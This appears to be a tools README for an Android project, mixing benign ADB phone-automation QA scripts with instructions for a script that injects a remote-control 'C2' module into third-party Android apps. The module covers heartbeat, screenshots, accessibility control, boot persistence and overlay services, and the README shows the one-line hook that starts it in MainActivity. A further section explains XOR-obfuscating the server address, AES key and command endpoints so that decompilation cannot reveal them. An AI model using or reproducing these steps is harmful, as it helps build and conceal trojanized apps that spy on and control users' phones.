# tools/ 说明

## adb_local_control.py — Local ADB phone control for QA

A safe local-only helper for direct device testing. It uses `adb` against a connected phone and does not use server commands, hidden control, contact reads, or shell execution.

### Default behavior

Run with no arguments:

```bash
python tools/adb_local_control.py
```

This uses:

- default device serial: `a82e747d`
- default task file: `tools/adb_tasks.json`
- default output directory: `tools/out`

### Supported actions in `adb_tasks.json`

```json
{
  "tasks": [
    {"action": "launch"},
    {"action": "wait", "seconds": 2},
    {"action": "tap", "x": 960, "y": 540},
    {"action": "swipe", "x1": 1600, "y1": 540, "x2": 300, "y2": 540, "duration_ms": 350},
    {"action": "key", "keycode": "KEYCODE_BACK"},
    {"action": "text", "text": "test 123"},
    {"action": "screenshot", "name": "step01.png"},
    {"action": "stop"}
  ]
}
```

### Quick commands

```bash
python tools/adb_local_control.py status
python tools/adb_local_control.py shot
python tools/adb_local_control.py run tools/adb_tasks.json
```
## inject_sdk.py — 一键将 SDK 注入第三方 Android 项目

把本项目的 C2 模块（心跳、截图、无障碍控制、卡密验证等）批量复制并适配到另一个 Android 项目。

### 用法

```
cd <本项目根目录>/tools
python inject_sdk.py <目标项目根目录> <目标包名>
```

**示例：**
```
python inject_sdk.py D:\dev\TargetApp com.company.targetapp
```

### 脚本做了什么

| 步骤 | 内容 |
|------|------|
| 复制 Java 文件 | 把 SDK 的所有 Java 类复制到目标项目对应包路径，自动替换 package 声明和包引用 |
| 复制 C++ 文件 | 把 `secure.c` + `CMakeLists.txt` 复制到目标项目 `app/src/main/cpp/` |
| 复制 XML | 把无障碍服务配置 `accessibility_service_config.xml` 复制到目标 `res/xml/` |
| 修改 build.gradle | 注入 OkHttp/Gson 依赖、NDK 版本、CMake 配置 |
| 修改 AndroidManifest | 注入所需权限、无障碍服务、开机广播、悬浮窗服务、卡密 Activity |

### 注入完成后还需要手动做的事

1. **配置服务器地址和密钥** — 编辑 `gen_blobs.py`，改好 `secrets[]` 后生成新的 blob 数据，粘贴到 `app/src/main/cpp/secure.c` 对应位置（见下方 gen_blobs.py 说明）

2. **在 MainActivity.onCreate() 里启动 C2：**
   ```java
   // setContentView 之后加：
   DeviceC2.start(this);

   // 可选：首次运行弹出无障碍引导
   // PermissionGuideHelper.checkAndRequestAccessibility(this);

   // 可选：卡密验证闸门（放在 onCreate 最开头）
   // CardGate.check(this);
   ```

3. **构建 APK：** `./gradlew assembleDebug`

---

## gen_blobs.py — 生成 secure.c 的加密常量

用于更新服务器地址、AES 密钥、各端点路径等敏感字符串，以 XOR 混淆后嵌入 .so，防止静态反编译直接读出明文。

### 用法

**第一步：** 编辑 `gen_blobs.py`，修改 `secrets[]` 数组：

```python
secrets = [
    "http://你的服务器IP",   # 0 BASE_URL
    "你的AES密钥16位",       # 1 AES key
    "/",                     # 2 config endpoint（一般不改）
    "/kami/verify",          # 3 卡密验证接口
    "/device/register",      # 4 注册接口
    "/device/heartbeat",     # 5 心跳接口
    "/device/ack",           # 6 命令确认接口
    "156",                   # 7 版本号（version_shell）
]
```

**第二步：** 运行脚本，把输出复制到 `secure.c`：

```
python gen_blobs.py
```

输出示例：
```c
static const unsigned char B0[] = {0x3c,0x5a,...};
...
static const unsigned char* const BLOBS[] = {B0,B1,...};
static const int LENS[] = {22,16,...};
#define NBLOBS 8
```

**第三步：** 打开 `app/src/main/cpp/secure.c`，把上面输出的内容替换掉对应的 `B0[]~B7[]`、`BLOBS[]`、`LENS[]`、`NBLOBS` 定义。

**第四步：** 重新编译：`./gradlew assembleDebug`

### 注意事项

- `secrets[]` 顺序与索引 **必须** 与 `Vault.java` 中的 `ID_*` 常量一一对应，不能调换
- 修改服务器地址后，已装机设备需重装新 APK 才能指向新地址
- AES 密钥同时用于加密通信，服务端 `card_server/.env` 里的 `AES_KEY` 必须保持一致


### Return-to-lobby test

Use this task file when the game is already inside a table and you only want to return to the lobby, close the notice page, and stop:

```bash
python tools/adb_local_control.py run tools/adb_tasks_return_lobby.json
```

### Team-page safe test

Use this task file when you only want to tap the lobby `战队` area, wait, and capture before/after screenshots without entering any table:

```bash
python tools/adb_local_control.py run tools/adb_tasks_open_team_view.json
```

### Auto evidence mode

You can add `--auto-shot` to save one screenshot after each non-screenshot task step. Every run also writes a timestamped log file into `tools/out`.

Example:

```bash
python tools/adb_local_control.py --auto-shot run tools/adb_tasks_return_lobby.json
python tools/adb_local_control.py --auto-shot run tools/adb_tasks_open_team_view.json
```
